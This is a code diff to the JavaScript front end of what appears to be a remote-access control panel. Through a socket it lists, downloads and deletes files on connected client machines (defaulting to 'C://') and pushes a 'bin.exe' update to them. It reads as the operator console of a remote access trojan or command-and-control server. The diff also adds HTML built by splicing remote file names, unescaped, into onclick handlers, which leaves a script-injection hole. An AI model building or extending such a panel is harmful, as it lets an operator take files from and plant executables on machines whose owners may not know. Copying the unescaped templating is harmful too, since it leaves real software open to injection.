@@ -116,7 +116,13 @@
     }
 
     function ls(cl, path) {
-      currPath = path.indexOf('..') != -1  ? 'C://' : path;
+      if (path.indexOf('../') == path.length - 3) {
+        const f = path.split('/');
+        f.pop();
+        f.pop();
+        f.pop();
+        currPath = f.join('/') + '/';
+      } else currPath = path;
       console.log('ls', cl, path);
       socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath});
     }
@@ -138,19 +144,41 @@
       socket.emit('client:send', {sid: cl, cmd: 'update', args: {path: 'bin.exe', name: prompt('name')}});
     }
 
+    function rm(cl, path, name) {
+      if (confirm('delete ' + path + name)) {
+        console.log('rm', cl);
+        socket.emit('client:send', {sid: cl, cmd: 'rm', args: {path: path + name}});
+        ls(cl, path);
+      }
+    }
+
+
+    function clearTree() {
+      const $tree = $('#tree');
+      $tree.empty();
+      $tree.data('client', '');
+    }
 
     function fileTree(c, f) {
       const $tree = $('#tree');
       $tree.empty();
       $tree.data('client', c);
+      $tree.append($('<div><button onclick="clearTree()">Close</button>' + currPath + '</div>'));
       for (var i in f) {
         const x = f[i].replace('./', '');
-        const el = $('<div style="cursor:pointer" id="' + x + '">');
-        el.html(f[i]);
-        console.log(f[i][0]);
-        if (f[i][0] == '.') el.on('click', () => ls(c, currPath + x + '/'));
-        else el.on('click', () => download(c, x, currPath + x));
-
+        if (!x.length || x == '.') continue;
+        const template = `
+          <div id="${x}">
+            <table>
+              <tr>
+                <td ${f[i][0] == '.' ? ` style="cursor:pointer" onclick="ls(${c},'${currPath+x}/')"` : ''}>${f[i]}</td>
+                <td>${f[i][0] != '.' ? `<button style="cursor:pointer" onclick="download(${c},'${x}','${currPath + x}')">download</button>` : ''}</td>
+                <td>${f[i][0] != '.' ? `<button style="cursor:pointer" onclick="rm(${c},'${currPath}','${x}')">delete</button>` : ''}</td>
+              </tr>
+            </table>
+          </div>
+        `;
+        const el = $(template);
         $tree.append(el);
       }
     }
